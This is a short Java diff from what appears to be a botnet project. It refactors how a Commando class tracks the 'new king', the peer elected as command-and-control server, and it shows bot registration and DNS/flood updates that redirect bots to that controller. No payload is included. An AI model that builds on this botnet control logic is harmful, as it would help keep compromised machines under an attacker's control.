@@ -61,6 +61,7 @@ public class Commando {
 
 	@Autowired
 	private NetworkService nServ;
+
 	@Autowired
 	private P2PMan pServ;
 
@@ -70,7 +71,6 @@ public class Commando {
 	@Autowired
 	private CryptoUtils crypto;
 
-	private String newKing;
 
 	/**
 	 * 
@@ -86,7 +86,6 @@ public class Commando {
 
 		// non necessario
 		// nServ.updateDnsInformation();
-		newKing = nServ.getIdHash();
 		pServ.initP2P();
 		System.out.println("peer to peer fatto");
 		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
@@ -231,7 +230,7 @@ public class Commando {
 	public boolean abdicate() {
 
 		System.out.println("dns updating..");
-		Bot b = bServ.searchBotId(newKing);
+		Bot b = bServ.searchBotId(pServ.getNewKing());
 		if (b != null) {
 			System.out.println("bot dns" + b.getIp());
 			IP ip = new IP(b.getIp());
@@ -239,7 +238,7 @@ public class Commando {
 			newKingDns(ip, pk);
 			newKingFlood(ip, pk);
 			nServ.getCommandConquerIps().remove(0);
-			nServ.getCommandConquerIps().add(new Pairs( ip, pki.rebuildPuK(pk)));
+			nServ.getCommandConquerIps().add(new Pairs<IP, PublicKey>( ip, pki.rebuildPuK(pk)));
 			System.out.println("dns updated..");
 
 			// TODO DropDATABASE
@@ -280,7 +279,7 @@ public class Commando {
 				String ip = ccList.get((int) Math.ceil(Math.random() * (ccList.size() - 1)));
 				System.out.println("ho eletto " + ip);
 				if (ccReq.becameCc(ip)) {
-					newKing = bServ.searchBotIP(ip).getIdBot();
+					pServ.setNewKing( bServ.searchBotIP(ip).getIdBot());
 				}
 				System.out.println("erection completed ");
 			} else
@@ -290,13 +289,7 @@ public class Commando {
 		}
 	}
 
-	public String getNewKing() {
-		return newKing;
-	}
 
-	public void setNewKing(String newKing) {
-		this.newKing = newKing;
-	}
 
 	public RoleServiceImpl getrServ() {
 		return rServ;
@@ -342,6 +335,14 @@ public class Commando {
 		this.bReq = bReq;
 	}
 
+	public P2PMan getpServ() {
+		return pServ;
+	}
+
+	public void setpServ(P2PMan pServ) {
+		this.pServ = pServ;
+	}
+	
 }
 
 // for (int i = 1; i < 20; i++) {
